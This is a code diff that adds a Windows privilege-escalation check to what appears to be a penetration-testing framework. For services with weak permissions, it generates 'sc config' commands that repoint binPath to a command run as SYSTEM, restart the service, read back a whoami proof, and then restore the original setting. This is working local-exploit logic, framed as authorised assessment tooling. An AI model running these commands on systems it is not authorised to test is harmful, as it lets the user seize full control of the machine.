@@ -442,10 +442,33 @@ def _d_win_unquoted(facts, ctx):
             cleanup=cleanup, report_type="unquoted_service", builds=builds)
 
 
+def _d_win_weak_service(facts, ctx):
+    stage = ctx.stage_win
+    for name, binpath in sorted(facts.reconfigurable_services.items()):
+        # a native one-shot: repoint binPath to a command that runs as SYSTEM when the
+        # SCM starts it (it then read-backs the proof), and restore binPath after. No
+        # payload to build — the binPath value *is* the command.
+        proof = f"{stage}\\sc_{re.sub(r'[^A-Za-z0-9]', '_', name)}.txt"
+        yield Vector(
+            key=f"weakservice:{name}", title=f"weak service perms ({name}) → SYSTEM",
+            exploitability="high", safety="config-change", detection="moderate",
+            command=(f'sc config {name} binPath= "cmd /c whoami > {proof}" & '
+                     f"sc stop {name} >nul 2>&1 & sc start {name} >nul 2>&1 & "
+                     f"ping -n 4 127.0.0.1 >nul & type {proof}"),
+            shell="cmd", host=ctx.host,
+            detail=f"the ACL on service {name!r} grants SERVICE_CHANGE_CONFIG to a broad "
+                   "group — repoint binPath to a SYSTEM command (native, no payload).",
+            evidence=f"sc sdshow {name}: change-config granted to a broad principal",
+            safe_proof="binPath is set to `whoami`, the service restarted, the result read "
+                       "back — then binPath is restored.",
+            cleanup=f'sc config {name} binPath= {binpath} & del {proof}',
+            report_type="weak_service_perms")
+
+
 #: OS -> the drivers that apply. Append to extend the knowledge base.
 DRIVERS = {
     LINUX: (_d_sudo_all, _d_sudo_gtfo, _d_suid_gtfo, _d_caps, _d_docker_group, _d_sudo_env),
-    WINDOWS: (_d_win_privs, _d_win_aie, _d_win_unquoted),
+    WINDOWS: (_d_win_privs, _d_win_aie, _d_win_unquoted, _d_win_weak_service),
 }
 
 
